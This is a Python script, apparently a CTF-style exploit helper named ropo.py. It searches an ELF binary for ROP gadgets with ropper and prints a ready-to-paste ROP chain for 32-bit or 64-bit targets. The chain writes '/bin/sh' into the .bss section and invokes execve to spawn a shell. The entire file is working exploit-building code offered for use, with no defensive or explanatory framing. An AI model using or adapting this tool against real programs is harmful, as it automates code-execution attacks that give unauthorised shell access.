#!/usr/bin/env python3
# author: tripoloski / arsalan.dp@gamail.com
# pardon my shitty code


import sys, getopt
from ropper import RopperService
from elftools.elf.elffile import ELFFile

def ffropper(x):
    x = str(x).split()[0].replace(":","")
    return x

def craft_payloadx86(addr, msg, string=0):
    if string == 0:
        return "p += pack('I',{}) # {}\n".format(addr , msg)
    else:
        return "p += {} # {}\n".format(addr , msg)

def craft_payloadx64(addr, msg, string=0):
    if string == 0:
        return "p += pack('Q',{}) # {}\n".format(addr , msg)
    else:
        return "p += {} # {}\n".format(addr , msg)

def load_elfx86(elf):
    rs = RopperService()
    rs.addFile(elf)
    

    rs.loadGadgetsFor()

    for file, gadget in rs.search(search="pop ecx; pop ebx; ret", name=elf):
        pop_ecx_ebx = ffropper(gadget)
    print("[+] pop ecx; ebx; ret; : " + pop_ecx_ebx)

    for file, gadget in rs.search(search="pop eax; ret;", name=elf):
        pop_eax = ffropper(gadget)
    print("[+] pop eax; ret; : " + pop_eax)
    
    for file, gadget in rs.search(search="pop edx; ret;", name=elf):
        pop_edx = ffropper(gadget)
    print("[+] pop edx; ret; : " + pop_edx)

    for file, gadget in rs.search(search="mov [edx], eax; ret", name=elf):
        mov_edx_eax = ffropper(gadget)
    print("[+] mov dword ptr [edx], eax; ret; : " + mov_edx_eax)
    
    for file, gadget in rs.search(search="int 0x80; ret;", name=elf):
        int0x80 = ffropper(gadget)
    print("[+] int 0x80; ret; : " + int0x80)

    with open(elf, 'rb') as f:
        e = ELFFile(f)
        for section in e.iter_sections():
            if section.name == ".bss":
                bss = section["sh_addr"]
    print("[+] bss segment : " + hex(bss))

    payload =  craft_payloadx86(pop_eax , "pop eax; ret")
    payload += craft_payloadx86("'/bin'" , "/bin/sh string", string=1)
    payload += craft_payloadx86(pop_edx , "pop edx; ret")
    payload += craft_payloadx86(hex(bss) , "bss+0")
    payload += craft_payloadx86(mov_edx_eax , "mov dword ptr [edx], eax; ret; ")
    payload += craft_payloadx86(pop_eax , "pop eax; ret")
    payload += craft_payloadx86("'/sh\\x00'" , "/bin/sh string", string=1)
    payload += craft_payloadx86(pop_edx , "pop edx; ret")
    payload += craft_payloadx86(hex(bss+4) , "bss+4")
    payload += craft_payloadx86(mov_edx_eax , "mov dword ptr [edx], eax; ret; ")
    payload += craft_payloadx86(pop_eax, "pop eax; ret")
    payload += craft_payloadx86(str(11), "execve()")
    payload += craft_payloadx86(pop_edx, "pop edx; ret")
    payload += craft_payloadx86(0, "0")
    payload += craft_payloadx86(pop_ecx_ebx, "pop ecx; ebx; ret")
    payload += craft_payloadx86("0", "0")
    payload += craft_payloadx86(hex(bss), "bss")
    payload += craft_payloadx86(int0x80, "int 0x80; ret;")


    return payload

def load_elfx64(elf):
    rs = RopperService()
    rs.addFile(elf)

    rs.loadGadgetsFor()

    for file, gadget in rs.search(search="pop rdx; ret;", name=elf):
        pop_rdx = ffropper(gadget)
    print("[+] pop rdx; ret; : " + pop_rdx)

    for file, gadget in rs.search(search="pop rax; ret;", name=elf):
        pop_rax = ffropper(gadget)
    print("[+] pop rax; ret; : " + pop_rax)

    for file, gadget in rs.search(search="pop rsi; ret;", name=elf):
        pop_rsi = ffropper(gadget)
    print("[+] pop rsi; ret; : " + pop_rsi)

    for file, gadget in rs.search(search="pop rdi; ret;", name=elf):
        pop_rdi = ffropper(gadget)
    print("[+] pop rdi; ret; : " + pop_rdi)

    for file, gadget in rs.search(search="mov [rdx], rax; ret; ", name=elf):
        mov_rdx_rax = ffropper(gadget)
        # print(gadget)
    print("[+] mov qword ptr [rdx], rax; ret; : " + mov_rdx_rax)

    for file, gadget in rs.search(search="syscall; ret;", name=elf):
        syscall = ffropper(gadget)
    print("[+] syscall; ret; : " + syscall)


    with open(elf, 'rb') as f:
        e = ELFFile(f)
        for section in e.iter_sections():
            if section.name == ".bss":
                bss = section["sh_addr"]
    print("[+] bss segment : " + hex(bss))

    payload =   craft_payloadx64(pop_rax, "pop rax; ret;")
    payload +=  craft_payloadx64("'/bin/sh\\x00'", "/bin/sh string", string=1)
    payload +=  craft_payloadx64(pop_rdx, "pop rdx; ret;")
    payload +=  craft_payloadx64(bss, "bss")
    payload +=  craft_payloadx64(mov_rdx_rax, "mov [rdx], rax; ret")
    payload +=  craft_payloadx64(pop_rax , "pop rax; ret")
    payload +=  craft_payloadx64(59 , "execve()")
    payload +=  craft_payloadx64(pop_rdi , "pop rdi; ret")
    payload +=  craft_payloadx64(bss , "bss")
    payload +=  craft_payloadx64(pop_rsi , "pop rsi; ret")
    payload +=  craft_payloadx64(0 , "NULL")
    payload +=  craft_payloadx64(pop_rdx , "pop rdx; ret")
    payload +=  craft_payloadx64(0 , "NULL")
    payload +=  craft_payloadx64(syscall , "syscall")

    return payload



def help_msg():
    print("ropo.py -b <elf> -m <mode>")

def main(argv):
    elf_file = ""
    mode = ""
    try:
        opts, args = getopt.getopt(argv, "b:m:", ["elf_file=","mode="])
    except getopt.GetoptError:
        help_msg()
        sys.exit(2)

    if len(argv) == 0:
        help_msg()
        sys.exit(2)

    for opt, arg in opts:
        if opt == "-h" or opt == "":
            help_msg()
            sys.exit(2)
        elif "-b" in opt:
            elf_file = arg
        elif "-m" in opt:
            mode = arg
        
    print("[+] load elf     : " + elf_file)
    print("[+] using mode   : " + str(mode))
    with open(elf_file, 'rb') as f:
        e = ELFFile(f)
    binarch = e.get_machine_arch()
    if mode == '10' and binarch == "x86":
        payload = load_elfx86(elf_file)
        print("\n\n")
        print(payload)

    elif mode == "20" and binarch == "x64":
        payload = load_elfx64(elf_file)
        print("\n\n")
        print(payload)
    else:
        print("[!] not supported")
        help_msg()
    




if __name__ == "__main__":
    main(sys.argv[1:])